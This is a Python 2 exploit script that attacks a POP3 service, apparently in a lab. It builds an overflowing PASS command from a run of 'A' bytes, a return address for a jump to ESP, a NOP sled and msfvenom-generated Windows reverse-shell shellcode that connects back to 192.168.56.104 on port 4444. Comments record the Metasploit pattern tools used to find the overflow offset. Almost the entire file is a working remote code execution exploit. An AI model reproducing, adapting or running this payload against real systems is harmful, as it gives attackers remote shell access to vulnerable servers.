#!/usr/bin/python
import socket

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.104 LPORT=4444 -b "\x00\x0A\x0D\x20" -f python

#/usr/share/metasploit-framework/tools/exploit/pattern_create.rb 2900
#/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 44396944

#esp jump


buf =  ""
buf += "\xdb\xdb\xbd\x55\xc2\x43\x96\xd9\x74\x24\xf4\x5f\x29"
buf += "\xc9\xb1\x52\x31\x6f\x17\x03\x6f\x17\x83\x92\xc6\xa1"
buf += "\x63\xe0\x2f\xa7\x8c\x18\xb0\xc8\x05\xfd\x81\xc8\x72"
buf += "\x76\xb1\xf8\xf1\xda\x3e\x72\x57\xce\xb5\xf6\x70\xe1"
buf += "\x7e\xbc\xa6\xcc\x7f\xed\x9b\x4f\xfc\xec\xcf\xaf\x3d"
buf += "\x3f\x02\xae\x7a\x22\xef\xe2\xd3\x28\x42\x12\x57\x64"
buf += "\x5f\x99\x2b\x68\xe7\x7e\xfb\x8b\xc6\xd1\x77\xd2\xc8"
buf += "\xd0\x54\x6e\x41\xca\xb9\x4b\x1b\x61\x09\x27\x9a\xa3"
buf += "\x43\xc8\x31\x8a\x6b\x3b\x4b\xcb\x4c\xa4\x3e\x25\xaf"
buf += "\x59\x39\xf2\xcd\x85\xcc\xe0\x76\x4d\x76\xcc\x87\x82"
buf += "\xe1\x87\x84\x6f\x65\xcf\x88\x6e\xaa\x64\xb4\xfb\x4d"
buf += "\xaa\x3c\xbf\x69\x6e\x64\x1b\x13\x37\xc0\xca\x2c\x27"
buf += "\xab\xb3\x88\x2c\x46\xa7\xa0\x6f\x0f\x04\x89\x8f\xcf"
buf += "\x02\x9a\xfc\xfd\x8d\x30\x6a\x4e\x45\x9f\x6d\xb1\x7c"
buf += "\x67\xe1\x4c\x7f\x98\x28\x8b\x2b\xc8\x42\x3a\x54\x83"
buf += "\x92\xc3\x81\x04\xc2\x6b\x7a\xe5\xb2\xcb\x2a\x8d\xd8"
buf += "\xc3\x15\xad\xe3\x09\x3e\x44\x1e\xda\x81\x31\x18\x72"
buf += "\x6a\x40\x58\x93\x36\xcd\xbe\xf9\xd6\x9b\x69\x96\x4f"
buf += "\x86\xe1\x07\x8f\x1c\x8c\x08\x1b\x93\x71\xc6\xec\xde"
buf += "\x61\xbf\x1c\x95\xdb\x16\x22\x03\x73\xf4\xb1\xc8\x83"
buf += "\x73\xaa\x46\xd4\xd4\x1c\x9f\xb0\xc8\x07\x09\xa6\x10"
buf += "\xd1\x72\x62\xcf\x22\x7c\x6b\x82\x1f\x5a\x7b\x5a\x9f"
buf += "\xe6\x2f\x32\xf6\xb0\x99\xf4\xa0\x72\x73\xaf\x1f\xdd"
buf += "\x13\x36\x6c\xde\x65\x37\xb9\xa8\x89\x86\x14\xed\xb6"
buf += "\x27\xf1\xf9\xcf\x55\x61\x05\x1a\xde\x91\x4c\x06\x77"
buf += "\x3a\x09\xd3\xc5\x27\xaa\x0e\x09\x5e\x29\xba\xf2\xa5"
buf += "\x31\xcf\xf7\xe2\xf5\x3c\x8a\x7b\x90\x42\x39\x7b\xb1"


bytes= "A"*2607 + "\xD7\x30\x9D\x7C"+ "\x90"*(390-351) + buf
#"BBBB" +"C"*(3000-2611)   

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.56.104",110))
    r = s.recv(1024)
    print r
    #raw_input()

    s.send("USER teste\r\n") 
    r=s.recv(1024)
    print r
    #raw_input()

    s.send("PASS"+bytes+"\r\n")
    r = s.recv(1024)
    print r
    #raw_input()

    s.send("QUIT\r\n")
    r= s.recv(1024)
    print r
    #raw_input()
except:
    print "Erro"